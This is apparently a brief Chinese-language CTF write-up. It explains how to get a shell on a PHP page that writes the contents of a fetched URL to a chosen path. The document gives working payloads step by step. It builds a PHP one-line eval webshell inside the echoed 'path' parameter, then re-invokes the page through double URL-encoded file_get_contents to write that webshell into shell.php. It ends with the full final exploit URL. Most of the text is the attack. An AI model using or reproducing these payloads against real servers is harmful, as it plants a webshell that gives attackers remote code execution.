页面功能就是将 file 指定的文件内容内容放到 path 路径下,需要 getshell

仔细分析后发现传参后的输出
`echo "console.log($path update successed!)";`  中的 path 被输出出来且可控，只需要将 path 构造成一句话木马并通过 file_put_contents 函数将该传参后的输出写入 shell 文件即可

一步一步来看，首先构造 path
`file=http://127.0.0.1/&path=%3C?php%20eval($_REQUEST[c]);?%3E.php`

成功构造出 `<?php eval($_REQUEST[c]);?>.php`

接着想办法把输出
`console.log(<?php eval($_REQUEST[c]);?>.php update successed!)` 写入另一文件

结合 file\_get\_contents，想到可以二次调用该文件，并将 payload 进行编码并当作二次执行的参数传入
`file=http://127.0.0.1/?file%3dhttp%3a%2f%2f127.0.0.1%2f%26path%3d%253C%3fphp%2520eval(%24_REQUEST%5bc%5d)%3b%3f%253E.php`

最终 Payload : 
`http://ip:8001/?file=http://127.0.0.1/?file%3dhttp%3a%2f%2f127.0.0.1%2f%26path%3d%253C%3fphp%2520eval(%24_REQUEST%5bc%5d)%3b%3f%253E.php&path=shell.php`
